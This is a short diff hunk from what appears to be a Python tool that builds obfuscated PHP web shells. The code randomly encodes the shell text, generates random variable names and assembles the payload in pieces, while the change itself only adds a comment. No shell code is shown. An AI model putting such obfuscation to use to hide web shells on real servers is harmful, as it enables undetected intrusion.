@@ -68,7 +68,7 @@ class Php(Shell):
 		shell_encoded, cs1, cs2 = Encoders(self.shell_text).Random()
 		vals = self.makeVals(shell_encoded)
 		self.vars = [ '$' + self.makeVars() for _ in range(4) ]
-		
+		# generate
 		payload = self.vars[3] + ' = ""; \n' 
 		payload += self.vars[0] + ' = ""; \n' 
 		payload += ''.join([ self.vars[0] + ' .= "' + clean_str(v) + '"; \n' for v in vals ]) 
